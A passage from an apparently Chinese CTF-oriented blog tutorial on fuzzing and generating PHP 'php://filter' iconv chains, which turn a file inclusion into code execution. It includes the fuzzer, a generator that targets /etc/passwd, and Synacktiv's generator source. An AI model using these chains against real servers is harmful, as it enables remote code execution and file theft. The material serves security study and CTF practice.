class="hljs-variable">$r_t</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[mutating from exist dic] &quot;</span>.<span class="hljs-variable">$files</span>[<span class="hljs-variable">$r_t</span>].<span class="hljs-string">&quot;: &quot;</span>.<span class="hljs-variable">$seed</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$seed</span>;<br>&#125;<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123; <span class="hljs-comment">//这个死循环是fuzz的核心，通过不断的和陌生人(随机数对应的编码串)相识，孜孜不倦的寻找着属于她自己的爱情......啧，多么枯燥且无味（x。</span><br>    <span class="hljs-variable">$tmp_str</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <br>    <span class="hljs-comment">//$rand = rand(1,999999);</span><br>    <span class="hljs-variable">$op</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// if($last_op == $filter_list[0])&#123;</span><br>        <span class="hljs-variable">$rand_2</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>);<br>        <span class="hljs-variable">$rand_3</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>);<br><br>        <span class="hljs-variable">$icon1</span> = <span class="hljs-variable">$iconv_list</span>[<span class="hljs-variable">$rand_2</span> % <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$iconv_list</span>)];<br><br>        <span class="hljs-variable">$icon2</span> = <span class="hljs-variable">$iconv_list</span>[<span class="hljs-variable">$rand_3</span> % <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$iconv_list</span>)];<br>        <span class="hljs-variable">$op</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-variable">$icon1</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$icon2</span>,<span class="hljs-variable">$filter_list</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment">//随机拼接，就像每天会遇到无数人一样（</span><br>    <span class="hljs-comment">// &#125; else &#123;</span><br>    <span class="hljs-comment">//     if($rand % 6 &gt; 1)&#123;</span><br>    <span class="hljs-comment">//         $rand_2 = rand(1,999999);</span><br>    <span class="hljs-comment">//         $rand_3 = rand(1,999999);</span><br>    <span class="hljs-comment">//         $icon1 = $iconv_list[$rand_2 % count($iconv_list)];</span><br>    <span class="hljs-comment">//         $icon2 = $iconv_list[$rand_3 % count($iconv_list)];</span><br>    <span class="hljs-comment">//         $op = str_replace(&#x27;*&#x27;,$icon1.&#x27;.&#x27;.$icon2,$filter_list[1]);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">//     else&#123;</span><br>    <span class="hljs-comment">//         $op =  $filter_list[0];</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-variable">$tmp_str</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/&#x27;</span>.<span class="hljs-variable">$op_all</span>.((<span class="hljs-variable">$op_all</span> == <span class="hljs-string">&quot;&quot;</span>)?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-string">&#x27;|&#x27;</span>).<span class="hljs-variable">$op</span>.<span class="hljs-string">&#x27;|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=&#x27;</span>.<span class="hljs-variable">$input</span>); <span class="hljs-comment">//将随机拼接好的字符规则进行利用读取并存储在$tmp_str中</span><br><br>    <span class="hljs-comment"># print(&quot;Try fuzz &quot;.&quot;php://filter/&quot;.$op_all.(($op_all == &quot;&quot;)?&#x27;&#x27;:&#x27;|&#x27;).$op.&#x27;|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=&#x27;.$input.&quot;\n&quot;); //添加了对应的输出文本x</span><br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$tmp_str</span>)&#123; <span class="hljs-comment">//如果$tmp_str不存在（拼接之后不能生成）就跳过</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$tmp_str</span> === <span class="hljs-variable">$prev_str</span>)&#123;<br>        <span class="hljs-keyword">continue</span>; <span class="hljs-comment">//如果和上一次结果一样就跳过x</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$op_all</span>)&gt;<span class="hljs-variable">$op_all_max</span>)&#123; <span class="hljs-comment">//如果长度超过最大设定长度就置空</span><br>        <span class="hljs-variable">$last_op</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>)% <span class="hljs-number">5</span> &gt; <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-variable">$op_all</span> = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            获取res文件夹中存在的字典作为基础种子进行再拼接</span><br><span class="hljs-comment">        */</span> <br>        <span class="hljs-comment">// $r_t = rand(1,999999);</span><br>        <span class="hljs-comment">// $files = getseeds(&#x27;./res/&#x27;);</span><br>        <span class="hljs-comment">// $r_t = $r_t % sizeof($files);</span><br>        <span class="hljs-comment">// $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);</span><br>        <span class="hljs-comment">// $op_all = $seed;</span><br>        <span class="hljs-variable">$op_all</span> = <span class="hljs-variable">$op_all</span> = <span class="hljs-title function_ invoke__">getRandomSeedFromDir</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>);<br>        <span class="hljs-comment"># echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\n&quot;;</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$tmp_str</span>) &gt; <span class="hljs-variable">$max_c_len</span>)&#123;<br>        <span class="hljs-variable">$last_op</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>)% <span class="hljs-number">5</span> &gt; <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-variable">$op_all</span> = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// $r_t = rand(1,999999);</span><br>        <span class="hljs-comment">// $files = getseeds(&#x27;./res/&#x27;);</span><br>        <span class="hljs-comment">// $r_t = $r_t % sizeof($files);</span><br>        <span class="hljs-comment">// $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);</span><br>        <span class="hljs-comment">// $op_all = $seed;</span><br>        <span class="hljs-variable">$op_all</span> = <span class="hljs-variable">$op_all</span> = <span class="hljs-title function_ invoke__">getRandomSeedFromDir</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>);<br>        <span class="hljs-comment"># echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\n&quot;;</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$tmp_str</span>,<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span> === <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-comment"># print(&quot;Oh $r is non-compliance ! skip now! \n&quot;);</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/([a-zA-Z0-9])/&quot;</span>,<span class="hljs-variable">$r</span>, <span class="hljs-variable">$res</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$res</span>[<span class="hljs-number">0</span>])===<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$r</span>) &amp;&amp; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$res</span>[<span class="hljs-number">0</span>])==<span class="hljs-number">1</span> )&#123;<br><br>        <span class="hljs-comment">//$ttt = quoted_printable_encode($tmp_str);</span><br>            <span class="hljs-comment">// echo &quot;[!!] Magic:\n ------------------------------------------\n &quot; . $tmp_str . &quot;\n&quot;;</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./res/&quot;</span>.<span class="hljs-variable">$r</span>))&#123; <span class="hljs-comment">//即使爱情已经存在，但她依然想最求更好的未来</span><br>                <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;./res/&quot;</span>.<span class="hljs-variable">$r</span>));<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$size</span>&gt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$op_all</span>.((<span class="hljs-variable">$op_all</span> == <span class="hljs-string">&quot;&quot;</span>)?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-string">&#x27;|&#x27;</span>).<span class="hljs-variable">$op</span>))&#123;<span class="hljs-comment">//所以当她遇上更好的，会毅然的离开(指匹配到更优更短的串)</span><br>                    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;./res/&quot;</span> . <span class="hljs-variable">$r</span>,  <span class="hljs-variable">$op_all</span>.((<span class="hljs-variable">$op_all</span> == <span class="hljs-string">&quot;&quot;</span>)?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-string">&#x27;|&#x27;</span>).<span class="hljs-variable">$op</span>);<br>                    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Got Superior (of shorter length):<span class="hljs-subst">$r</span> &quot;</span>.<span class="hljs-variable">$op_all</span>.((<span class="hljs-variable">$op_all</span> == <span class="hljs-string">&quot;&quot;</span>)?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-string">&#x27;|&#x27;</span>).<span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//空虚的内心似乎得到了眷顾，这是第一次她遇见的爱情，她欣然接受(指如果不存在则会直接创建)</span><br>                <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Got <span class="hljs-subst">$r</span> &quot;</span>.<span class="hljs-variable">$op_all</span>.((<span class="hljs-variable">$op_all</span> == <span class="hljs-string">&quot;&quot;</span>)?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-string">&#x27;|&#x27;</span>).<span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;./res/&quot;</span> . <span class="hljs-variable">$r</span>, <span class="hljs-variable">$op_all</span>.((<span class="hljs-variable">$op_all</span> == <span class="hljs-string">&quot;&quot;</span>)?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-string">&#x27;|&#x27;</span>).<span class="hljs-variable">$op</span>);<br>            &#125;<br>            <span class="hljs-comment">//否则她还是会一如既往的，向爱情献上忠诚。</span><br>            <span class="hljs-variable">$last_op</span> = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>)% <span class="hljs-number">5</span> &gt; <span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-variable">$op_all</span> = <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// $r_t = rand(1,999999);</span><br>            <span class="hljs-comment">// $files = getseeds(&#x27;./res/&#x27;);</span><br>            <span class="hljs-comment">// $r_t = $r_t % sizeof($files);</span><br>            <span class="hljs-comment">// $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);</span><br>            <span class="hljs-variable">$op_all</span> = <span class="hljs-variable">$op_all</span> = <span class="hljs-title function_ invoke__">getRandomSeedFromDir</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>);<br>            <span class="hljs-comment"># echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\n&quot;;</span><br><br>            <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$tmp_str</span> === <span class="hljs-variable">$init_value</span>)&#123;<br>        <span class="hljs-variable">$last_op</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>)% <span class="hljs-number">5</span> &gt; <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-variable">$op_all</span> = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// $r_t = rand(1,999999);</span><br>        <span class="hljs-comment">// $files = getseeds(&#x27;./res/&#x27;);</span><br>        <span class="hljs-comment">// $r_t = $r_t % sizeof($files);</span><br>        <span class="hljs-comment">// $seed = file_get_contents(&#x27;./res/&#x27;.$files[$r_t]);</span><br>        <span class="hljs-variable">$op_all</span> = <span class="hljs-variable">$op_all</span> = <span class="hljs-title function_ invoke__">getRandomSeedFromDir</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>);<br>        <span class="hljs-comment"># echo &quot;[mutating from exist dic] &quot;.$files[$r_t].&quot;: &quot;.$seed.&quot;\n&quot;;</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$last_op</span> = <span class="hljs-variable">$op</span>;<br>        <span class="hljs-variable">$prev_str</span> = <span class="hljs-variable">$tmp_str</span>;<br>        <span class="hljs-variable">$op_all</span> .= ((<span class="hljs-variable">$op_all</span> == <span class="hljs-string">&quot;&quot;</span>)?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-string">&#x27;|&#x27;</span>).<span class="hljs-variable">$op</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>下面的test.py是链的生成程序，当你提供payload的base64字符串形式时，他会寻找每个字符hexcode对应的编码进行payload生成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">file_to_use = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br><br><span class="hljs-comment">#在这里放入你要生成的payload的base64形式：</span><br>base64_payload = <span class="hljs-string">&quot;YWFh&quot;</span><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        filters += <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)))).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)).read() + <span class="hljs-string">&quot;|&quot;</span> <span class="hljs-comment"># 这里是使用对应字符的hexcode来寻找对应编码，你也可以采用下面的方式，因为fuzz生成器最后生成的结果是按字符名存储并没有hex编码</span><br>        <span class="hljs-comment"># filters += open(&#x27;./res/&#x27;+c).read() + &quot;|&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;use &quot;</span>+ c + <span class="hljs-string">&quot;:&quot;</span> +<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>+c).read())<br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;&lt;?php echo file_get_contents(&quot;&#x27;</span>+final_payload+<span class="hljs-string">&#x27;&quot;);?&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(final_payload)<br></code></pre></td></tr></table></figure><p>单独说一下，<code>convert.iconv.UTF8.UTF7</code>的作用是为了防止中途出现的base64补位的等号导致解释器失效或者报错，所以用它将等号转换为其他字符(base64合法字符)</p><h3 id="php-filter-chain-generator-synacktiv"><a href="#php-filter-chain-generator-synacktiv" class="headerlink" title="php_filter_chain_generator @synacktiv"></a><a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a> @synacktiv</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># - Useful infos -</span><br><span class="hljs-comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span><br><span class="hljs-comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span><br><span class="hljs-comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span><br><br><span class="hljs-comment"># No need to guess a valid filename anymore</span><br>file_to_use = <span class="hljs-string">&quot;php://temp&quot;</span><br><br>conversions = <span class="hljs-string">&quot;dic.array&quot;</span><span class="hljs-comment">#太长了省略一下x</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_filter_chain</span>(<span class="hljs-params">chain, debug_base64 = <span class="hljs-literal">False</span></span>):<br><br>    encoded_chain = chain<br>    <span class="hljs-comment"># generate some garbage base64</span><br>    filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>    filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>    <span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>    filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encoded_chain[::-<span class="hljs-number">1</span>]:<br>        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> debug_base64:<br>        <span class="hljs-comment"># don&#x27;t add the decode while debugging chains</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>    final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> final_payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    <span class="hljs-comment"># Parsing command line arguments</span><br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;PHP filter chain generator.&quot;</span>)<br><br>    parser.add_argument(<span class="hljs-string">&quot;--chain&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="hljs-literal">False</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--rawbase64&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="hljs-literal">False</span>)<br>    args = parser.parse_args()<br>    <span class="hljs-keyword">if</span> args.chain <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        chain = args.chain.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        base64_value = base64.b64encode(chain).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        chain = generate_filter_chain(base64_value)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(args.chain, base64_value))<br>        <span class="hljs-built_in">print</span>(chain)<br>    <span class="hljs-keyword">if</span> args.rawbase64 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        rawbase64 = args.rawbase64.replace(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">match</span>):<br>            chain = generate_filter_chain(rawbase64, <span class="hljs-literal">True</span>)<br>            <span class="hljs-built_in">print</span>(chain)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[-] Base64 string required.&quot;</span>)<br>            exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>其实核心部分就这几行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encoded_chain[::-<span class="hljs-number">1</span>]:<br>    filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>    <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>    filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>    filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>    <span class="hljs-comment"># get rid of equal signs</span><br>    filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> debug_base64:<br>    <span class="hljs-comment"># don&#x27;t add the decode while debugging chains</span><br>    filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><span class="hljs-keyword">return</span> final_payload<br></code></pre></td></tr></table></figure><p>和test.py其实是一样的，所以不多赘述x，不过相比起来这个更好理解~</p><h2 id="filterChainFuzzerAndGenerator-（自己改了一份优化版本x"><a href="#filterChainFuzzerAndGenerator-（自己改了一份优化版本x" class="headerlink" title="filterChainFuzzerAndGenerator （自己改了一份优化版本x"></a><a href="https://github.com/ProbiusOfficial/filterChainFuzzerAndGenerator">filterChainFuzzerAndGenerator</a> （自己改了一份优化版本x</h2><p>一个基于php和python的Filter链的fuzz和生成程序。</p><p>可能使用的场景:</p><ul><li>无文件RCE</li><li>CTF中的Web</li><li>CTF中的MISC</li><li>……（更多可能？）</li></ul><h3 id="About"><a href="#About" class="headerlink" title="About"></a>About</h3><p>你可以在下面这篇文档中了解原理和更多细节</p><ul><li><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">【idekCTF 2022】Paywall — filter链构造和扩展</a></li></ul><p>此外，感谢下面的项目提供的思路</p><ul><li><a href="https://github.com/loknop">https://github.com/loknop</a> <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></li><li><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></li><li><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></li></ul><p>项目目录各个文件的作用如下：</p><ul><li>Fuzzer.php 用于Fuzz filter链需要的字典<ul><li>iconv_list.php Fuzz中字符集文件，可以按照场景自定义对应编码集</li><li>init Fuzzer包含用文件，基本无需改动</li></ul></li><li><a href="http://generator.py/">Generator.py</a> 用于生成任意payload的Filter链</li><li><a href="http://aview.py/">aview.py</a> 输出.res 文件夹中字典一览</li><li>get_dic.py 将.res文件夹中的单字符文件转换为自定义的dictionary.py字典</li><li><a href="http://dictionary.py/">dictionary.py</a> 单字符字典，可以自定义，默认使用get_dic.py生成</li></ul><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="Fuzz-1"><a href="#Fuzz-1" class="headerlink" title="Fuzz"></a>Fuzz</h4><p>Fuzz依靠Fuzzer.php实现</p><p>在iconv_list.php中定义你fuzz需要的字符集</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110380.png" alt="img"></p><p>根据对应环境选择对应的字符集合：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iconv -l<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110566.png" alt="img"></p><p>在Fuzzer.php中设置好参数：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110182.png" alt="img"></p><p>使用下面命令即可开始Fuzz：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php Fuzzer.php<br></code></pre></td></tr></table></figure><h4 id="Generator"><a href="#Generator" 